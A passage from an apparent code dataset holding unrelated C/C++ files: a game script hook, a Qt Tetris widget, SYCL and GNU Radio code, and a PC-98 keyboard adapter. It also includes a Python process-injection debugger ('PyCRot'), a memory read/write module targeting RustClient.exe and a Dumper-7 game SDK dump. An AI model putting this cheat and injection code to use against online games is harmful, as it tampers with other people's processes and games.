script->m_anStack[--script->m_nSP];\n\n            if (CTimer::m_snTimeInMilliseconds >= script->m_nWakeTime) {\n                while (!ProcessOneCommand(script)) {\n                }\n            }\n\n            if (!script->m_bAwake)\n                return;\n\n            if (!(CPad::GetPad(0)->NewState.ButtonCross && !CPad::GetPad(0)->OldState.ButtonCross))\n                return;\n\n            script->m_nWakeTime = 0;\n\n            for (int i = 0; i < 6; i++) {\n                if (CMessages::BIGMessages[i].m_Stack[0].m_pText != nullptr)\n                    CMessages::BIGMessages[i].m_Stack[0].m_nStartTime = 0;\n            }\n\n            if (CMessages::BriefMessages[0].m_pText != nullptr)\n                CMessages::BriefMessages[0].m_nStartTime = 0;\n        };\n        plugin::patch::RedirectCall(0x4393DF, LAMBDA(void, __fastcall, processScriptHook, CRunningScript*, void*));\n    }\n} scmExtender;\n",
    "#include \"widget.h\"\n#include \"tetristable.h\"\n#include \"ui_widget.h\"\n#include <QMessageBox>\n#include <QRandomGenerator>\n// #include <QSettings>\n\nWidget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget) {\n  ui->setupUi(this);\n  QString basePath = QCoreApplication::applicationDirPath();\n  setWindowTitle(\"Qtetris\");\n  setWindowIcon(QIcon(basePath + \"/resources/images/logo.png\"));\n  //  \u6548\u679c\u4e0d\u4f73  this->setStyleSheet(\"background-image:\n  //    url(/home/gh0s7/project/qt6/Qtetris/resources/images/78355322_p0.jpg);\");\n  mediaPlayer = new QMediaPlayer(this);\n  QAudioOutput *audioOutput = new QAudioOutput;\n  audioOutput->setVolume(0.6);\n  mediaPlayer->setAudioOutput(audioOutput);\n  // mediaPlayer->setMedia(QUrl::fromLocalFile(\"/home/gh0s7/project/qt6/Qtetris/resources/audio/flower.ogg\"));\n  // auto *playlist = new QMediaPlaylist();\n  // bgm\u90fd\u662f\u81ea\u5df1\u7528\u5f00\u6e90\u7f16\u66f2\u8f6f\u4ef6lmms\u7f16\u66f2\u7684\uff0c\u539f\u66f2\u6765\u81ea\u4e0a\u6d77\u7231\u8389\u4e1d\u5e7b\u4e50\u56e2qwq\n  QStringList audioFiles = {// \u5e7f\u91cd36\u53f7\n                            basePath + \"/resources/audio/neoexpress.wav\",\n                            // \u5b87\u5b99\u9732\u5929\u5496\u5561\u5ea7\n                            basePath + \"/resources/audio/CafeTerrace.ogg\",\n                            // \u82b1\u5982\u5e7b\u60f3\u4e00\u822c\n                            basePath + \"/resources/audio/flower.ogg\",\n                            // \u5bfb\u627e\u65e5\u672c\u5404\u5904\u4e4b\u795e\u79d8\n                            basePath + \"/resources/audio/mistery.wav\",\n                            // \u65e0\u95f4\u4e4b\u949f\n                            basePath + \"/resources/audio/clock.wav\",\n                            // \u5e7b\u60f3\u51c0\u7409\u7483\n                            basePath + \"/resources/audio/glass.wav\"};\n  currentIndex = 0;\n  mediaPlayer->setSource(QUrl::fromLocalFile(audioFiles[currentIndex]));\n  QObject::connect(\n      mediaPlayer, &QMediaPlayer::mediaStatusChanged, mediaPlayer, [=]() {\n        if (mediaPlayer->mediaStatus() == QMediaPlayer::EndOfMedia) {\n          currentIndex = (currentIndex + 1) % audioFiles.size();\n          mediaPlayer->setSource(QUrl::fromLocalFile(audioFiles[currentIndex]));\n          mediaPlayer->play();\n        }\n      });\n  mediaPlayer->play();\n  /* \u539fqt5\u5199\u6cd5\uff0c\u76f8\u5173\u63a5\u53e3\u5df2\u5e9f\u5f03\n    QString audioPath = basePath + \"/resources/audio/neoexpress.wav\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/CafeTerrace.ogg\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/flower.ogg\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/mistery.wav\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/clock.wav\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/glass.wav\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n\n    playlist->setPlaybackMode(QMediaPlaylist::Loop);\n    mediaPlayer->setVolume(50);\n    mediaPlayer->setPlaylist(playlist);\n    mediaPlayer->play();\n  */\n  m_nextBlockState = (QRandomGenerator::global()->bounded(10)) * 4;\n  ui->tableWidget_next->updateBlock(m_nextBlockState);\n  connect(ui->pushButton_music, &QPushButton::clicked, this,\n          &Widget::onMusicButtonClicked);\n  connect(ui->pushButton_start, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_start_onClicked);\n  connect(ui->pushButton_space, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_space_onClicked);\n  connect(ui->pushButton_down, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_down_onClicked);\n  connect(ui->pushButton_left, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_left_onClicked);\n  connect(ui->pushButton_right, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_right_onClicked);\n  connect(ui->pushButton_revolve, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_revolve_onClicked);\n  connect(ui->pushButton_pause, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_pause_onClicked);\n  connect(ui->pushButton_difficulty, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_difficulty_onClicked);\n  connect(ui->pushButton_history, &QPushButton::clicked, this,\n          &Widget::showHistory);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_enter, this,\n          &Widget::slot_pushButton_start_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_up, this,\n          &Widget::slot_pushButton_revolve_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_down, this,\n          &Widget::slot_pushButton_down_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_left, this,\n          &Widget::slot_pushButton_left_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_right, this,\n          &Widget::slot_pushButton_right_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_space, this,\n          &Widget::slot_pushButton_space_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_pause, this,\n          &Widget::slot_push",
    "#include <WinSock2.h>\n#include <Windows.h>\n#include <tlhelp32.h>\n#include <algorithm>\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <tchar.h>\n#include <stdio.h>\n#include <psapi.h>\n#include <random>\n#include <string>\n#include <future>\n\n#pragma comment(lib, \"ws2_32.lib\")\n\nstd::string pyCRotBootstrapper = \"\\n\\tdef __init__(self,currentLocals):\\n\\t\\tdel currentLocals[self.__class__.__name__];self.locals=currentLocals;self.compile=__import__('codeop').CommandCompiler();self.importTable={'threading':__import__('threading'),'traceback':__import__('traceback'),'random':__import__('random'),'inspect':__import__('inspect'),'ctypes':__import__('ctypes'),'socket':__import__('socket'),'sys':__import__('sys'),'dis':__import__('dis'),'os':__import__('os')};self.currentThreadID=self.importTable['ctypes'].windll.kernel32.GetCurrentThreadId();self.interpreterBuffer=[];self.cApis={};self.breakpointTypes=['variable','value','constant','exception','line'];self.vtypeMapping={'var':'variable','val':'value','const':'constant','exc':'exception','ln':'line'};self.breakpoints=[];self.debuggerBuffer=[];self.debuggerEnabled=False;self.currentBreakpoint=None;self.localSelfName=''.join(self.importTable['random'].SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')for _ in range(16));self.locals[self.localSelfName]=self;self.cApis['OpenThread']=self.importTable['ctypes'].windll.kernel32.OpenThread;self.cApis['SuspendThread']=self.importTable['ctypes'].windll.kernel32.SuspendThread;self.cApis['ResumeThread']=self.importTable['ctypes'].windll.kernel32.ResumeThread;self.cApis['CreateToolhelp32Snapshot']=self.importTable['ctypes'].windll.kernel32.CreateToolhelp32Snapshot;self.cApis['Thread32First']=self.importTable['ctypes'].windll.kernel32.Thread32First;self.cApis['Thread32Next']=self.importTable['ctypes'].windll.kernel32.Thread32Next;self.cApis['CloseHandle']=self.importTable['ctypes'].windll.kernel32.CloseHandle;self.cApis['ThreadEntry32']=self.importTable['ctypes'].c_ulong*7;self.importTable['sys']._settraceallthreads(self.traceHook)\\n\\t\\tif self.shouldSuspendThreads:self.suspendAllThreads()\\n\\t\\tsock=self.importTable['socket'].socket(self.importTable['socket'].AF_INET,self.importTable['socket'].SOCK_STREAM);sock.connect(('127.0.0.1',self.serverPort));self.rfile=sock.makefile('r');self.wfile=sock.makefile('w');self.interact()\\n\\tdef help(self):self.log(\\\"Welcome to PyCRot's help utility! Here you can see all the functions in the hidden class and what they do!\\\");self.log('');self.log(self.localSelfName+'.log(argument)\\\\t\\\\t\\\\tThis function outputs whatever you pass into it in the PyCRot terminal');self.log(self.localSelfName+'.suspendAllThreads()\\\\t\\\\tSuspends all running threads (except for the pycrot one)');self.log(self.localSelfName+'.resumeAllThreads()\\\\t\\\\tResumes all running threads (except for the pycrot one)');self.log(self.localSelfName+'.addBreakpoint(type, value)\\\\tAdds a breakpoint to the table, also callable with addBP() or addbp()');self.log(self.localSelfName+'.deleteBreakpoint(type, value)\\\\tRemoved a breakpoint to the table, also callable with delBP() or delbp()');self.log(self.localSelfName+'.clearBreakpoints()\\\\t\\\\tClears the breakpoint table, also callable with clsBP() or clsbp()');self.log('');self.log('Breakpoint types:');self.log('\\\\tvariable/var\\\\t\\\\t\\\\t\\\\tBreakpoints when a variable with the specified name is found');self.log('\\\\tvalue/val\\\\t\\\\t\\\\t\\\\tBreakpoints when a variable with the specified value is found');self.log('\\\\tconstant/const\\\\t\\\\t\\\\t\\\\tBreakpoints when a constant with the specified value is found');self.log('\\\\texception/exc\\\\t\\\\t\\\\t\\\\tBreakpoints when a exception is triggered');self.log('\\\\tline/ln\\\\t\\\\t\\\\t\\\\t\\\\tBreakpoints when a number line gets executed')\\n\\tdef writeRaw(self,data):self.wfile.write(data);self.wfile.flush()\\n\\tdef suspendAllThreads(self):self.actionOnThreads('SuspendThread')\\n\\tdef resumeAllThreads(self):self.actionOnThreads('ResumeThread')\\n\\tdef traceHook(self,currentFrame,event,arg):\\n\\t\\tcurrentFBack=currentFrame\\n\\t\\twhile currentFBack.f_back!=None:\\n\\t\\t\\tcurrentFBack=currentFBack.f_back\\n\\t\\t\\tif currentFBack.f_locals.get('self')==self:return self.traceHook\\n\\t\\tcurrentFrame.f_trace_opcodes=True\\n\\t\\tfor vbreakpoint in self.breakpoints.copy():\\n\\t\\t\\tif vbreakpoint==True:self.triggerBreakpoint(currentFrame,vbreakpoint,'breakpoint on next execution')\\n\\t\\t\\telif vbreakpoint['type']=='variable':\\n\\t\\t\\t\\tif vbreakpoint['value']in currentFrame.f_locals.keys():self.triggerBreakpoint(currentFrame,vbreakpoint,str(vbreakpoint['value'])+' found in locals with value '+str(currentFrame.f_locals[vbreakpoint['value']]),arg)\\n\\t\\t\\telif vbreakpoint['type']=='value':\\n\\t\\t\\t\\tif vbreakpoint['value']in currentFrame.f_locals.values():self.triggerBreakpoint(currentFrame,vbreakpoint,str(vbreakpoint['value'])+' found in locals with key '+str(list(currentFrame.f_locals.keys())[list(currentFrame.f_locals.values()).index(vbreakpoint['value'])]),ar",
    "#include <fmt/core.h>\n#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/tagged_stream_to_pdu.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <pmtv/pmt.hpp>\n#include <boost/ut.hpp>\n#include <complex>\n#include <numeric>\n\nint main()\n{\n    using namespace boost::ut;\n\n    gr::Graph fg;\n\n    std::vector<int> v(30);\n    std::iota(v.begin(), v.end(), 0);\n    const std::vector<gr::Tag> tags = { { 0, { { \"packet_len\", 10 } } },\n                                        { 3, { { \"foo\", \"bar\" } } },\n                                        { 10, { { \"packet_len\", 20 } } } };\n    auto& source = fg.emplaceBlock<gr::packet_modem::VectorSource<int>>(v, false, tags);\n    auto& stream_to_pdu = fg.emplaceBlock<gr::packet_modem::TaggedStreamToPdu<int>>();\n    auto& sink =\n        fg.emplaceBlock<gr::packet_modem::VectorSink<gr::packet_modem::Pdu<int>>>();\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(source).to<\"in\">(stream_to_pdu)));\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(stream_to_pdu).to<\"in\">(sink)));\n\n    gr::scheduler::Simple sched{ std::move(fg) };\n    expect(sched.runAndWait().has_value());\n\n    const auto data = sink.data();\n    std::print(\"vector sink contains {} items\\n\", data.size());\n    std::print(\"vector sink items:\\n\");\n    for (const auto& pdu : data) {\n        fmt::println(\"data = {}\", pdu.data);\n        fmt::println(\"tags:\");\n        for (const auto& t : pdu.tags) {\n            fmt::println(\"index = {}, map = {}\", t.index, t.map);\n        }\n    }\n    std::print(\"\\n\");\n    std::print(\"vector sink tags:\\n\");\n    const auto sink_tags = sink.tags();\n    for (const auto& t : sink_tags) {\n        fmt::print(\"index = {}, map = {}\\n\", t.index, t.map);\n    }\n\n    return 0;\n}\n",
    "#include \"BasicKernel.h\"\n\n#ifdef _DEBUG\n#include <string>\n#include <iostream>\n#endif // _DEBUG\n\n/// <summary>\n/// \u521b\u5efa\u8ba1\u7b97\u961f\u5217\n/// </summary>\n/// <returns></returns>\nsycl::queue* CreateDPCQueue()\n{\n\t// \u6839\u636e\u9ed8\u8ba4\u7684\u8bbe\u5907\u9009\u62e9\u5668\u521b\u5efa\u961f\u5217\n\tsycl::queue* pstRetQueue = new(std::nothrow) sycl::queue(sycl::default_selector_v);\n\tif (pstRetQueue == nullptr) return nullptr;\n\n#ifdef _DEBUG\n\tstd::string strDeviceClassName;\n\tif (pstRetQueue->get_device().is_cpu()) strDeviceClassName.assign(\"CPU\");\n\telse if (pstRetQueue->get_device().is_gpu()) strDeviceClassName.assign(\"GPU\");\n\telse strDeviceClassName.assign(\"\u5176\u4ed6\u8bbe\u5907\");\n\tstd::cout << \"\u8bbe\u5907\u7c7b\u578b: \" << strDeviceClassName << std::endl\n\t\t<< \"\u8bbe\u5907\u540d\u79f0: \" <<\n\t\tpstRetQueue->get_device().get_info<sycl::info::device::name>()\n\t\t<< std::endl << \"\u8bbe\u5907\u5185\u5b58: \" <<\n\t\tpstRetQueue->get_device().get_info<sycl::info::device::global_mem_size>() / 1024.0 / 1024.0 / 1024.0 << \"GB\"\n\t\t<< std::endl << \"WorkGroup\u672c\u5730\u5185\u5b58: \" << pstRetQueue->get_device().get_info<sycl::info::device::local_mem_size>() / 1024.0 << \"KB\"\n\t\t<< std::endl << \"\u6700\u5927\u5de5\u4f5c\u7ec4\u6570: \"\n\t\t<< pstRetQueue->get_device().get_info<sycl::info::device::max_work_group_size>()\n\t\t<< std::endl << \"\u5de5\u4f5c\u7ec4\u4e0b\u7684\u6700\u5927\u5de5\u4f5c\u9879\u6570: \"\n\t\t<< pstRetQueue->get_device().get_info<sycl::info::device::max_work_item_sizes<1>>().size() << std::endl;\n#endif // _DEBUG\n\n\treturn pstRetQueue;\n}\n\n/// <summary>\n/// \u83b7\u53d6\u6700\u5927\u5de5\u4f5c\u9879\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <returns></returns>\nsize_t GetMaxWorkItemSizes(sycl::queue* pstDPCQueue)\n{\n\treturn (pstDPCQueue != nullptr ? pstDPCQueue->get_device().get_info<sycl::info::device::max_work_item_sizes<1>>().size() : (size_t)0);\n}\n\n/// <summary>\n/// \u83b7\u53d6\u8ba1\u7b97\u6838\u5fc3\u7684\u672c\u5730\u5185\u5b58\u5927\u5c0f\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <returns></returns>\nsize_t GetLoaclMemorySize(sycl::queue* pstDPCQueue)\n{\n\treturn (pstDPCQueue != nullptr ? pstDPCQueue->get_device().get_info<sycl::info::device::local_mem_size>() : (size_t)0);\n}\n\n/// <summary>\n/// \u5206\u914d\u5185\u5b58\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <param name=\"nSize\"></param>\n/// <param name=\"eMemoryAlloc\"></param>\n/// <returns></returns>\nValueType* Malloc(sycl::queue* pstDPCQueue, int nSize, EMemoryAlloc eMemoryAlloc)\n{\n\tif (pstDPCQueue == nullptr || nSize <= 0) return nullptr;\n\n\tValueType* nRet = nullptr;\n\ttry\n\t{\n\t\tswitch (eMemoryAlloc)\n\t\t{\n\t\tcase Host:\n\t\t\tnRet = sycl::malloc_host<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tcase Device:\n\t\t\tnRet = sycl::malloc_device<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tcase Shared:\n\t\t\tnRet = sycl::malloc_shared<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t}\n\tcatch (const std::exception&)\n\t{\n\t\treturn nullptr;\n\t}\n\n\treturn nRet;\n}\n\n/// <summary>\n/// \u91ca\u653e\u5185\u5b58\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <param name=\"pData\"></param>\nvoid Free(sycl::queue* pstDPCQueue, ValueType* pData)\n{\n\tif (pstDPCQueue != nullptr && pData != nullptr)\n\t{\n\t\tsycl::free(pData, *pstDPCQueue);\n\t}\n}\n",
    "#include <Windows.h>\n#include <winternl.h>\n#include <Psapi.h>\n\n#ifdef _DEBUG\n#include \"usermode.h\"\nbool p9::memory::setup( ) {\n\tHANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, NULL );\n\tif ( ss ) {\n\t\tHANDLE process = NULL;\n\t\tPROCESSENTRY32 pe;\n\t\tpe.dwSize = sizeof( PROCESSENTRY32 );\n\t\tif ( Process32First( ss, &pe ) ) {\n\t\t\tdo {\n\t\t\t\tif ( !wcscmp( pe.szExeFile, ( L\"RustClient.exe\" ) ) ) {\n\t\t\t\t\tprocess = OpenProcess( PROCESS_ALL_ACCESS, false, pe.th32ProcessID );\n\t\t\t\t}\n\t\t\t} while ( Process32Next( ss, &pe ) );\n\t\t}\n\t\tCloseHandle( ss );\n\t\tprocess_handle = process;\n\t}\n\treturn process_handle;\n}\n\nvoid p9::memory::read( uintptr_t address, void* buffer, size_t size ) {\n\tif ( process_handle )\n\t\tReadProcessMemory( process_handle, ( LPCVOID )address, buffer, size, 0 );\n}\n\nvoid p9::memory::write( uintptr_t address, void* buffer, size_t size ) {\n\tif ( process_handle )\n\t\tWriteProcessMemory( process_handle, ( LPVOID )address, &buffer, size, NULL );\n}\n\np9::memory::module_t p9::memory::get_module( const std::wstring& name ) {\n\n\tmodule_t mod = { 0 };\n\tHANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, GetProcessId( process_handle ) );\n\tif ( ss ) {\n\t\tMODULEENTRY32 me;\n\t\tme.dwSize = sizeof( MODULEENTRY32 );\n\t\tif ( Module32First( ss, &me ) ) {\n\t\t\tdo {\n\t\t\t\tif ( !wcscmp( me.szModule, name.data( ) ) ) {\n\t\t\t\t\tmod.base = ( uint64_t )me.modBaseAddr;\n\t\t\t\t\tmod.size = ( uint64_t )me.modBaseSize;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t} while ( Module32Next( ss, &me ) );\n\t\t}\n\t\tCloseHandle( ss );\n\t}\n\treturn mod;\n}\n#endif // _DEBUG",
    "//---------------------------------------------------------------------\r\n// USB/Keyboard(Japanese) to PC98 Keyboard\r\n// \r\n// (Arduino Pro Mini 8MHz)\r\n// \u30fbUSB_Host_Shield_2.0 (https://github.com/felis/USB_Host_Shield_2.0)\r\n// \u30fbMsTimer2 (http://playground.arduino.cc/Main/MsTimer2)\r\n//\r\n// minidin8P   --  Arduino Pro Mini\r\n//  1 RST      --  1(D1)\r\n//  2 GND      --  GND\r\n//  3 RDY      --  \r\n//  4 RxD      --  2(D0)\r\n//  5 RTY      --  \r\n//  6          --  \r\n//  7          --  \r\n//  8 Vcc(+5V) --  Vcc(+5V)\r\n//\r\n// minidin9P   --  Arduino Pro Mini\r\n//  1 Vcc(+5V) --  \r\n//  2 XA       --  6(D3)\r\n//  3 XB       --  7(D4)\r\n//  4 YA       --  8(D5)\r\n//  5 YB       --  9(D6)\r\n//  6 L        --  10(D7)\r\n//  7 M        --  \r\n//  8 R        --  11(D8)\r\n//  9 GND      --  \r\n//---------------------------------------------------------------------\r\n#include <hidboot.h>\r\n#include <usbhub.h>\r\n#include <MsTimer2.h>\r\n#include \"keymap.h\"\r\n\r\n// DEBUG\r\n#define DEBUG       0     // 0:\u30c7\u30d0\u30c3\u30b0\u60c5\u5831\u51fa\u529b\u306a\u3057 1:\u30c7\u30d0\u30c3\u30b0\u60c5\u5831\u51fa\u529b\u3042\u308a\r\n#define LOBYTE(x) ((char*)(&(x)))[0]\r\n#define HIBYTE(x) ((char*)(&(x)))[1]\r\n\r\n// GPIO\r\n#define MS_XA       3     // Mouse XA\r\n#define MS_XB       4     // Mouse XB\r\n#define MS_YA       5     // Mouse YA\r\n#define MS_YB       6     // Mouse YB\r\n#define MS_LB       7     // Mouse LB\r\n#define MS_RB       8     // Mouse RB\r\n#define LED        13     // \u5185\u8535LED\r\n\r\n// \u5909\u6570\r\nvolatile uint8_t sCode = 0xff;          // \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9\r\nvolatile uint8_t prevScode = 0xff;      // \u524d\u56de\u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9\r\nvolatile int16_t sCodeCnt = 0;          // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u56de\u6570\r\nvolatile int16_t delayTime = 500;       // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u958b\u59cb(\u521d\u671f\u5024500ms)\r\nvolatile int16_t repeatTime = 110;      // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u9593\u9694(\u521d\u671f\u5024110ms)\r\n\r\nvolatile int16_t XYlimit = 256;         // \u30de\u30a6\u30b9\u30ea\u30df\u30c3\u30c8\u5024\r\nvolatile int16_t xState = 0;            // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(X)\r\nvolatile int16_t ySstate = 0;           // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(Y)\r\nvolatile int16_t bSstate = 0;           // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(B)\r\n\r\nvoid sendRepeat();\r\n//\r\n// HID\u30ad\u30fc\u30dc\u30fc\u30c9 \u30ec\u30dd\u30fc\u30c8\u30d1\u30fc\u30b5\u30fc\u30af\u30e9\u30b9\u306e\u5b9a\u7fa9\r\n//\r\nclass KbdRptParser : public KeyboardReportParser {\r\n  protected:\r\n    void OnControlKeysChanged(uint8_t before, uint8_t after);\r\n    void OnKeyDown(uint8_t mod, uint8_t key);\r\n    void OnKeyUp(uint8_t mod, uint8_t key);\r\n    void OnKeyPressed(uint8_t key) {};\r\n};\r\n\r\n//\r\n// HID\u30de\u30a6\u30b9 \u30ec\u30dd\u30fc\u30c8\u30d1\u30fc\u30b5\u30fc\u30af\u30e9\u30b9\u306e\u5b9a\u7fa9\r\n//\r\nclass MseRptParser : public MouseReportParser {\r\n  protected:\r\n    void OnMouseMove(MOUSEINFO *mi);\r\n    void OnLeftButtonUp(MOUSEINFO *mi);\r\n    void OnLeftButtonDown(MOUSEINFO *mi);\r\n    void OnRightButtonUp(MOUSEINFO *mi);\r\n    void OnRightButtonDown(MOUSEINFO *mi);\r\n};\r\n\r\n//\r\n// PC98 make\u30b3\u30fc\u30c9\u9001\u4fe1(\u30ad\u30fc\u62bc\u3057)\r\n// \u5f15\u6570 key(IN) HID Usage ID\r\n//\r\nvoid sendKeyMake(uint8_t key) {\r\n  // HID Usage ID \u304b\u3089 PC98 \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9 \u306b\u5909\u63db\r\n  uint8_t code = 0;\r\n  code = pgm_read_byte(&(keytable98[key]));\r\n  if (code == 0xff) {\r\n    return;\r\n  }\r\n  sCodeCnt++;\r\n  prevScode = code;\r\n#if DEBUG\r\n  Serial.print(F(\"UP2[\"));  Serial.print(F(\"key=\"));  Serial.print(key, HEX);\r\n  Serial.print(F(\" code=\"));  Serial.print(code, HEX);  Serial.println(F(\"]\"));\r\n#endif\r\n  // PC98\u30ad\u30fc\u306e\u767a\u884c\r\n  Serial.write(code);\r\n  sCode = code;\r\n  MsTimer2::set(delayTime, sendRepeat);\r\n  MsTimer2::start();\r\n}\r\n\r\n//\r\n// PC98 break\u30b3\u30fc\u30c9\u9001\u4fe1(\u30ad\u30fc\u96e2\u3057)\r\n// \u5f15\u6570 key(IN) HID Usage ID\r\n//\r\nvoid sendKeyBreak(uint8_t key) {\r\n  // HID Usage ID \u304b\u3089 PC98 \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9 \u306b\u5909\u63db\r\n  uint8_t code = 0;\r\n  code = pgm_read_byte(&(keytable98[key]));\r\n  if (code == 0xff) {\r\n    return;\r\n  }\r\n  sCodeCnt--;\r\n  if (prevScode == code) {\r\n    sCode = 0xff;\r\n  }\r\n#if DEBUG\r\n  Serial.print(F(\"DN [\"));  Serial.print(F(\"key=\"));  Serial.print(key, HEX);\r\n  Serial.print(F(\" code=\"));  Serial.print(code, HEX);  Serial.println(F(\"]\"));\r\n#endif\r\n  // PC98\u30ad\u30fc\u306e\u767a\u884c\u30ad\u30fc\u306e\u767a\u884c\r\n  Serial.write(code | 0x80);\r\n  if (sCodeCnt == 0) {\r\n    MsTimer2::stop();\r\n  }\r\n}\r\n\r\n//\r\n// \u30a2\u30c3\u30d7\u30c7\u30fc\u30c8\u30de\u30a6\u30b9\u30dc\u30bf\u30f3\r\n//\r\nvoid updateMouseBtn() {\r\n#ifdef DEBUG_MOUSE\r\n  Serial.print(\"bSstate = \");\r\n  Serial.println(bSstate,HEX);\r\n#endif\r\n  // \u30dc\u30bf\u30f3\u306e\u5224\u5b9a\r\n  switch (bSstate) {\r\n    case 0x00:\r\n      pinMode(MS_LB, INPUT);\r\n      pinMode(MS_RB, INPUT);\r\n      break;\r\n    case 0x01:\r\n      pinMode(MS_LB, OUTPUT);\r\n      pinMode(MS_RB, INPUT);\r\n      break;\r\n    case 0x02:\r\n      pinMode(MS_LB, INPUT);\r\n      pinMode(MS_RB, OUTPUT);\r\n      break;\r\n    case 0x03:\r\n      pinMode(MS_LB, OUTPUT);\r\n      pinMode(MS_RB, OUTPUT);\r\n      break;\r\n  }\r\n}\r\n\r\n//\r\n// \u30a2\u30c3\u30d7\u30c7\u30fc\u30c8\u30de\u30a6\u30b9X\r\n//\r\nvoid updateMouseX(bool di) {\r\n#ifdef DEBUG_MOUSE\r\n  Serial.print(\"xState = \");\r\n  Serial.println(xState,HEX);\r\n#endif\r\n  if (di) {\r\n    //+\u65b9\u5411(\u53f3\u65b9\u5411) 0->1->3->2\r\n    if (xState == 0) {\r\n      xState = 1;\r\n      pinMode(MS_XA, OUTPUT);\r\n      pinMode(MS_XB, INPUT);\r\n    } else if (xState == 1) {\r\n      xState = 3;\r\n      pinMode(MS_XA, OUTPUT);\r\n      pinMode(MS_XB, OUTPUT);\r\n    } else if (xState == 3) {\r\n      xState = 2;\r\n      pinMode(MS_XA, INPUT);\r\n      pinMode(MS_XB, OUTPUT);\r\n    } else if (xState == 2) {\r\n      xState = 0;\r\n      pinMode(MS_XA, INPUT);\r\n      pinMode(MS_XB, INPUT);\r\n    } else {\r\n      xState = 0;\r\n    }\r\n  } else {\r\n    //-\u65b9\u5411(\u5de6\u65b9\u5411) 2->3->1->0\r\n    if (xState == 2) {\r\n      xState = 3;\r\n      pinMode(MS_XA, OU",
    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// Class GameplayTasks.GameplayTasksComponent\n// (None)\n\nclass UClass* UGameplayTasksComponent::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"GameplayTasksComponent\");\n\n\treturn Clss;\n}\n\n\n// GameplayTasksComponent GameplayTasks.Default__GameplayTasksComponent\n// (Public, ClassDefaultObject, ArchetypeObject)\n\nclass UGameplayTasksComponent* UGameplayTasksComponent::GetDefaultObj()\n{\n\tstatic class UGameplayTasksComponent* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<UGameplayTasksComponent*>(UGameplayTasksComponent::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n\n// Function GameplayTasks.GameplayTasksComponent.OnRep_SimulatedTasks\n// (Final, Native, Public)\n// Parameters:\n\nvoid UGameplayTasksComponent::OnRep_SimulatedTasks()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"GameplayTasksComponent\", \"OnRep_SimulatedTasks\");\n\n\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n\n\tFunc->FunctionFlags = Flgs;\n\n}\n\n\n// Function GameplayTasks.GameplayTasksComponent.K2_RunGameplayTask\n// (Final, Native, Static, Public, BlueprintCallable)\n// Parameters:\n// TScriptInterface<class IGameplayTaskOwnerInterface>TaskOwner                                                        (Parm, ZeroConstructor, IsPlainOldData, NoDestructor, UObjectWrapper, 